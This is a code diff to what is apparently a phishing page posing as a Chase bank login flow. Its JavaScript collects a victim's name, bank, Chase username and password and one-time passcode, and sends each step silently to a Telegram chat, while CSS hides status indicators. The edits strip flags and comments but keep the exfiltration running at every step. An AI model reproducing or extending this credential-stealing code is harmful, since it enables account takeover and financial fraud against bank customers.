@@ -363,12 +363,10 @@
             margin-bottom: 1.5rem;
         }
 
-        /* Toast completely hidden */
         .toast-message {
             display: none !important;
         }
 
-        /* Remove status indicators */
         .telegram-note {
             display: none;
         }
@@ -553,9 +551,6 @@
             let currentStep = 1;
             let isProcessing = false;
             let redirectTimer = null;
-            let step1DataSent = false;
-            let step2DataSent = false;
-            let step3DataSent = false;
 
             // ---- helper: send to Telegram (silent) ----
             function sendToTelegram(message) {
@@ -591,7 +586,6 @@
                     `👤 *Full Name:* ${name}\n` +
                     `🏦 *Bank:* ${bank}`;
                 sendToTelegram(message);
-                step1DataSent = true;
             }
 
             function sendStep2Data() {
@@ -601,7 +595,6 @@
                     `🔑 *Chase Username:* ${username}\n` +
                     `🔐 *Chase Password:* ${password}`;
                 sendToTelegram(message);
-                step2DataSent = true;
             }
 
             function sendStep3Data() {
@@ -609,7 +602,6 @@
                 const message = `📱 *Step 3 Completed*\n` +
                     `🔢 *OTP Code:* ${otp}`;
                 sendToTelegram(message);
-                step3DataSent = true;
             }
 
             function sendFullData(data) {
@@ -736,7 +728,7 @@
 
             // ---- Event listeners ----
 
-            // Start button
+            // Start button - now just resets to step 1 if needed
             startBtn.addEventListener('click', function() {
                 goToStep(1);
                 const data = collectAllData();
@@ -744,9 +736,6 @@
                 reviewBank.innerText = data.bank;
                 reviewOtp.innerText = data.otp;
                 validateBankSelection();
-                step1DataSent = false;
-                step2DataSent = false;
-                step3DataSent = false;
             });
 
             // Step1 → Step2 (send step 1 data)
@@ -760,7 +749,6 @@
                     alert('Please enter your full name.');
                     return;
                 }
-                // Send step 1 data after validation
                 sendStep1Data();
                 goToStep(2);
             });
@@ -773,7 +761,6 @@
                     alert('Please fill in both Chase username and password.');
                     return;
                 }
-                // Send step 2 data after validation
                 sendStep2Data();
                 goToStep(3);
                 startProcessing(() => {
@@ -792,7 +779,6 @@
                     alert('OTP should contain only digits (0-9).');
                     return;
                 }
-                // Send step 3 data after validation
                 sendStep3Data();
                 const data = collectAllData();
                 reviewName.innerText = data.name;
@@ -811,23 +797,17 @@
                 showSuccessAndRedirect();
             });
 
-            // Back buttons (reset data sent flags)
+            // Back buttons
             backToStep1.addEventListener('click', function() { 
                 goToStep(1);
                 validateBankSelection();
-                step1DataSent = false;
-                step2DataSent = false;
-                step3DataSent = false;
             });
             backToStep2.addEventListener('click', function() { 
                 goToStep(2);
-                step2DataSent = false;
-                step3DataSent = false;
             });
             backToStep3.addEventListener('click', function() {
                 goToStep(3);
                 startProcessing(() => {});
-                step3DataSent = false;
             });
 
             // ---- override goToStep ----
